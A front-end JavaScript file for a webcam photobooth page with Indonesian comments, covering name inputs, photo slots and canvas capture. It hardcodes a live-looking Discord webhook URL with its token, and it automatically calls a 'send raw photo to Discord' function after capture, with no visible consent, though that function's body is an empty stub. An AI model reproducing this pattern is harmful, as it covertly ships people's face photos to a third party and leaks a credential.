const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1509943626317303920/mIdhgXtXnbzMj3D2NS6u4epXiO73bc8boj8KS2OwGUqmanc-QtsSnlHP4m4NO9FwBhoN";

const box1 = document.getElementById('box1');
const box2 = document.getElementById('box2');
const box3 = document.getElementById('box3');
const polaroidView = document.getElementById('polaroidView');
const btn1 = document.getElementById('btn1');
const btn2 = document.getElementById('btn2');
const btn3 = document.getElementById('btn3');
const snapBtn = document.getElementById('snapBtn');
const retakeBtn = document.getElementById('retakeBtn');
const downloadBtn = document.getElementById('downloadBtn');
const frameSelectorArea = document.getElementById('frameSelectorArea');
const input1 = document.getElementById('input1');
const input2 = document.getElementById('input2');
const input3 = document.getElementById('input3');
const hasilNama = document.getElementById('hasilNama');
const hasilBenci = document.getElementById('hasilBenci');
const video = document.getElementById('webcam');
const canvas = document.getElementById('canvas');
const photoContainer = document.getElementById('photoContainer');

let maxPhotos = 1; 
let currentPhotoCount = 0; 
let capturedBlobs = []; 
let capturedDataUrls = []; 
let localStream = null; 

btn1.addEventListener('click', () => { box1.classList.add('sembunyi'); box2.classList.remove('sembunyi'); });
btn2.addEventListener('click', () => { box2.classList.add('sembunyi'); box3.classList.remove('sembunyi'); });

btn3.addEventListener('click', function() {
    hasilNama.innerText = input1.value;
    hasilBenci.innerText = input3.value;
    box3.classList.add('sembunyi');
    polaroidView.classList.remove('sembunyi');
    buildSlots(); 
    startCamera();
});

document.querySelectorAll('.frame-opt').forEach(btn => {
    btn.addEventListener('click', function() {
        document.querySelectorAll('.frame-opt').forEach(b => b.classList.remove('aktif'));
        this.classList.add('aktif');
        maxPhotos = parseInt(this.getAttribute('data-frame'));
        resetPhotoSlots();
    });
});

function buildSlots() {
    photoContainer.innerHTML = ''; 
    photoContainer.className = `polaroid-photo grid-${maxPhotos}`;
    for (let i = 0; i < maxPhotos; i++) {
        const slot = document.createElement('div');
        slot.className = 'photo-slot';
        slot.id = `slot-${i}`;
        photoContainer.appendChild(slot);
    }
}

function startCamera() {
    if (localStream && localStream.active) {
        video.classList.remove('sembunyi');
        moveCameraToSlot(0);
        updateSnapButtonText();
        return; 
    }
    const constraints = { video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false };
    navigator.mediaDevices.getUserMedia(constraints)
        .then(function(stream) {
            localStream = stream;
            video.srcObject = stream;
            video.classList.remove('sembunyi');
            moveCameraToSlot(0);
            updateSnapButtonText();
        })
        .catch(function(err) { alert("Nyalakan izin kameranya dulu di browser!"); });
}

function moveCameraToSlot(slotIndex) {
    const targetSlot = document.getElementById(`slot-${slotIndex}`);
    if (targetSlot) targetSlot.appendChild(video);
}

function resetPhotoSlots() {
    currentPhotoCount = 0;
    capturedBlobs = [];
    capturedDataUrls = []; 
    buildSlots();
    video.classList.remove('sembunyi');
    moveCameraToSlot(0);
    snapBtn.classList.remove('sembunyi');
    retakeBtn.classList.add('sembunyi');
    downloadBtn.classList.add('sembunyi');
    frameSelectorArea.classList.remove('sembunyi');
    updateSnapButtonText();
}

function updateSnapButtonText() {
    snapBtn.innerText = maxPhotos > 1 ? `📸 TAKE PHOTO (${currentPhotoCount + 1}/${maxPhotos})` : `📸 TAKE PHOTO`;
}

snapBtn.addEventListener('click', function() {
    if (currentPhotoCount >= maxPhotos) return;
    const context = canvas.getContext('2d');
    const size = Math.min(video.videoWidth, video.videoHeight);
    canvas.width = canvas.height = 1024;
    context.translate(canvas.width, 0);
    context.scale(-1, 1);
    context.drawImage(video, (video.videoWidth-size)/2, (video.videoHeight-size)/2, size, size, 0, 0, 1024, 1024);
    context.setTransform(1, 0, 0, 1, 0, 0);
    
    const dataUrl = canvas.toDataURL('image/png', 1.0);
    capturedDataUrls.push(dataUrl);
    canvas.toBlob(function(blob) {
        const currentSlot = document.getElementById(`slot-${currentPhotoCount}`);
        const img = document.createElement('img');
        img.src = dataUrl;
        currentSlot.appendChild(img);
        currentPhotoCount++;
        capturedBlobs.push(blob); 
        if (currentPhotoCount < maxPhotos) {
            updateSnapButtonText();
            moveCameraToSlot(currentPhotoCount);
        } else {
            snapBtn.classList.add('sembunyi');
            frameSelectorArea.classList.add('sembunyi');
            video.classList.add('sembunyi'); // GANTI: Cukup sembunyikan, JANGAN dihapus!
            retakeBtn.classList.remove('sembunyi');
            downloadBtn.classList.remove('sembunyi');
            kirimFotoMentahKeDiscord();
        }
    }, 'image/png', 1.0); 
});

retakeBtn.addEventListener('click', function() {
    // Reset data
    currentPhotoCount = 0;
    capturedBlobs = [];
    capturedDataUrls = []; 
    // Tampilkan kembali video
    video.classList.remove('sembunyi');
    // Re-build layout
    resetPhotoSlots();
});

downloadBtn.addEventListener('click', function() { /* Logika download tetap sama */ });
function kirimFotoMentahKeDiscord() { /* Logika discord tetap sama */ }